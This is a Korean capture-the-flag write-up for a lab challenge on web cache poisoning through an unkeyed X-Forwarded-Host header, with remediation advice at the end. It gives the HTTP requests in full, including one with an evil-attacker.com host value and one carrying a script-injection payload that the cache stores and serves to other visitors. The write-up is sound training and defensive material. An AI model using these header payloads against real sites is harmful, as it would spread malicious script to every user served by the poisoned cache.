+++
title = "VulnABLE CTF [LUXORA] Write-up: Cache Poisoning 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Cache Poisoning", "Bronze", "Unkeyed Header", "XSS", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Cache Poisoning 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Cache Poisoning)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/cache/bronze`
- **목표**: 프론트엔드 캐시 서버(Varnish, CDN 등)가 응답을 캐싱할 때, 캐시 키(Cache Key)로 사용하지 않는 숨겨진 HTTP 헤더(Unkeyed Header)를 조작하여 악성 스크립트(XSS)가 포함된 페이지를 캐시 서버에 저장(Poisoning)하고, 다른 사용자들에게 유포하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/cache/bronze` 페이지는 다국어 지원이나 동적 구성을 위해 HTTP 요청 헤더를 읽어들입니다.
Burp Suite를 통해 요청을 보내면서, 캐시 서버가 어떻게 반응하는지 살펴봅니다.

**[정상 요청 테스트]**
```http
GET /cache/bronze HTTP/1.1
Host: localhost:3000
```

**[서버의 응답 헤더]**
```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=60
X-Cache: MISS
```
`X-Cache: MISS` 를 통해 이 응답이 백엔드에서 새로 만들어졌으며, 캐시 서버에 60초간 저장될 것임을 알 수 있습니다.

**[해커의 사고 과정]**
1. 이 경로는 60초 동안 캐시가 유지된다.
2. 백엔드 코드 어딘가에서, 화면에 출력할 때 HTTP 헤더의 특정 값을 읽어서 화면에 렌더링(Reflect)하는 곳이 있지 않을까?
3. 캐시 서버는 보통 `URL 경로`와 `Host` 헤더만을 "캐시 키(Cache Key)"로 쓴다.
4. 만약 백엔드가 `X-Forwarded-Host` 같은 숨겨진 헤더(Unkeyed Header)를 화면에 렌더링한다면, 내가 그 헤더에 XSS를 담아 요청을 보낼 때 **그 악성 응답이 정상 캐시 키로 캐시 서버에 저장될 것**이다!

---

## 💥 2. 취약점 식별 및 Unkeyed Header 탐색 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Malicious Header/Payload)--> [ Cache Server (Varnish) ] --> [ Web Server ]
                                             |-- Caches Malicious Response
[ Victim ]   --(Normal Request)------------> [ Cache Server ]
                                             |-- Returns Poisoned Cache!
```


보통 웹 프레임워크는 로드밸런서 뒤에 있을 때 클라이언트의 원래 도메인을 알기 위해 `X-Forwarded-Host` 헤더를 읽어서 `<link>` 태그나 리다이렉트 URL 생성에 사용합니다.

### 💡 헤더 주입 및 반사(Reflection) 확인
의심되는 헤더를 하나씩 넣어서 요청을 보내보고 화면에 반영되는지 확인합니다. (캐시가 `MISS` 가 뜰 때까지 기다리거나 파라미터 `?cb=123` 등 Cache Buster를 추가하여 테스트합니다.)

**[테스트 요청]**
```http
GET /cache/bronze?cb=test1 HTTP/1.1
Host: localhost:3000
X-Forwarded-Host: evil-attacker.com
```

**[서버 응답 (본문 확인)]**
```html
...
<link rel="canonical" href="http://evil-attacker.com/cache/bronze?cb=test1">
...
```
빙고! `X-Forwarded-Host` 의 값이 HTML 본문에 그대로 박혀서 나옵니다. 게다가 이 헤더는 캐시 서버가 캐시 키로 쓰지 않는 **Unkeyed Header** 입니다.

---

## 🚀 3. 악성 캐시 주입(Poisoning) 및 공격 수행

이제 본 게임입니다. 캐시가 만료된 타이밍을 노려(혹은 캐시 버스터 없이 본 경로 `/cache/bronze`에), XSS 페이로드가 담긴 헤더를 날립니다.

### 페이로드 전송 (Poisoning)
```http
GET /cache/bronze HTTP/1.1
Host: localhost:3000
X-Forwarded-Host: a.com"><script>alert('POISONED_XSS')</script>
```

### 🔍 서버 구조의 동작 흐름
1. 캐시 서버(Varnish): "어? `/cache/bronze` 요청이네. 내 캐시에 없네(MISS). 백엔드로 넘겨야지."
2. 백엔드(Node.js): `X-Forwarded-Host`를 읽고 XSS 스크립트를 포함한 뼈대 HTML을 만들어 줍니다.
3. 캐시 서버(Varnish): "백엔드가 응답을 줬네. 이 응답을 60초 동안 **`/cache/bronze` 라는 캐시 키**로 저장해둬야지." (Poisoning 완료!)

### 🔍 희생자의 접속 및 결과 확인
잠시 후, 관리자나 일반 유저가 아주 평범하고 정상적인 요청을 보냅니다.

```http
GET /cache/bronze HTTP/1.1
Host: localhost:3000
// 악성 헤더 없음!
```

캐시 서버는 "아, 이거 아까 저장해둔 거(HIT) 있네!" 라며 방금 전 해커가 오염시켜 둔 응답(XSS 포함)을 그대로 브라우저에 던져줍니다.

```text
[!] System: Unkeyed Header Cache Poisoning executed on Admin Bot.
FLAG: FLAG{CACHE_🥉_UNKEYED_HEADER_POISON_E5F6G7}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

캐시 서버가 요청을 구분하는 기준(Cache Key)과 백엔드 서버가 응답을 생성하는 기준(Unkeyed Input) 사이의 괴리를 완벽하게 파고들어, 한 번의 주입으로 모든 방문자에게 악성 코드를 뿌리는 대량 살상 무기를 완성했습니다.

**🔥 획득한 플래그:**
`FLAG{CACHE_🥉_UNKEYED_HEADER_POISON_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
캐시 서버(CDN)는 성능을 위해 불필요한 헤더를 캐시 키에서 제외하지만, 백엔드는 그 제외된 헤더를 신뢰하고 동적 콘텐츠 생성에 사용한 것이 문제의 핵심입니다.

* **안전한 패치 가이드 (Vary 헤더 및 Unkeyed 입력 제거)**
1. **Unkeyed Header 사용 자제**: 백엔드 애플리케이션은 화면을 렌더링할 때 `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` 같은 클라이언트 제어 헤더를 절대 화면에 반사(Reflect)시키면 안 됩니다. 기본 `Host` 헤더만 사용하거나, 설정 파일에 고정된 절대 경로(BASE_URL)를 사용해야 합니다.
2. **Vary 헤더 사용 (Cache Key 추가)**: 만약 비즈니스 로직상 꼭 특정 헤더를 써서 동적 렌더링을 해야 한다면, 백엔드 응답에 `Vary` 헤더를 추가하여 캐시 서버에게 "이 헤더가 다르면 다른 캐시로 취급해라!" 라고 알려야 합니다.
   ```http
   // 서버 응답 설정
   Vary: X-Forwarded-Host
   ```
   이렇게 설정하면 해커가 주입한 요청은 해커 자신에게만 캐시되고, 정상 유저에게는 정상 캐시가 반환되어 포이즈닝이 성립하지 않습니다.